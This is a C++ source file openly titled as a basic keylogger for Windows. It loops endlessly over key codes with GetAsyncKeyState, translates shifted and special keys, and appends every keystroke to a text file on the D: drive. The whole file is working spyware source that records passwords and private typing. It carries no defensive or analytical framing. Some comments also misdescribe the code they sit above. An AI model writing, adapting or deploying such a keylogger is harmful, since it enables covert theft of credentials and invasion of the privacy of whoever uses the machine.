//============================================================================
// Name        : Keylogger.cpp
// Author      : Honson Tran
// Version     : 1.0
// Copyright   : None
// Description : Basic Keylogger in C++
//============================================================================
//Declare libraries

// Declare Libraries
# include <iostream>	// Input output library
# include <windows.h>	// Include for Windows
# include <Winuser.h>	// Include for Windows
# include <fstream>		// Include to use file functions (such as ofstream and ifstream)

using namespace std;

// Declare Functions
void log();					// Logs key strokes.
char specialKey(char key); // returns the correct char


int main() {
	log();
	return 0;
}

/*
 * Logs Key strokes
 */
void log() {

	char key;

	for (;;) {

		//Specify the range of ASCII values you want to record.
		for (key = 8; key < 222; key++) {
			// -32767 is the number that detects when a key is pressed or not.

			if(GetAsyncKeyState(key) == -32767) {
				//ios::app tells write to continue where the file has left off.
				//Without ios:app, it would simply replace the file everytime.
				ofstream write ("D:\\Record.txt", ios::app);

				//Check for lower or upper case --> 61 < key < 91 are chars A-Z

				// !GetAsyncKeyState(0x10) : shift key is NOT pressed.
				// (GetKeyState(VK_CAPITAL) & 0x0001)!=0 : caps lock is not toggled on
				// Find these keys: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
				if ( key > 64 && key < 91 &&
						( !GetAsyncKeyState(0x10) && (GetKeyState(VK_CAPITAL) & 0x0001) != 1 ) ) {
					key += 32;			// convert to lower case.
					write << key;
					write.close();
					break;
				}

				//If it was just a mouse click, don't register anything.
				if( (GetKeyState(VK_LBUTTON) & 0x100) != 0 || (GetKeyState(VK_RBUTTON) & 0x100) != 0 ) {
					break;
				}

				//Special cases: !, ?, @, mouse clicks, etc.
				else if(GetAsyncKeyState(0x10)) {
					write << specialKey(key);
					break;
				}


				switch(key) {

					case 8: write << "<BackSpace>"; break;
					case 9: write << "<tab>"; break;
					case 27: write << "<Esc>"; break;
					case 127: write << "<Del>"; break;
					case 32: write << " "; break;
					case 13: write << "<Enter>\n"; break;

					default: write << key;
				}
			}
		}
	}

}

/*
 *
 */
char specialKey(char key) {

	switch(key){

			case '1': return '!';
			case '3': return '#';
			case '4': return '$';
			case '5': return '%';
			case '6': return '^';
			case '7': return '&';
			case '8': return '*';
			case '9': return '(';
			case '0': return ')';

			case 45: return '_';
			case '=': return '+';
			case '[': return '{';
			case ']': return '}';
			case '\\': return '|';
			case ';': return ':';
			case 39: return 34;	// ' --> "


			default: return key;
	}

	return key;
}
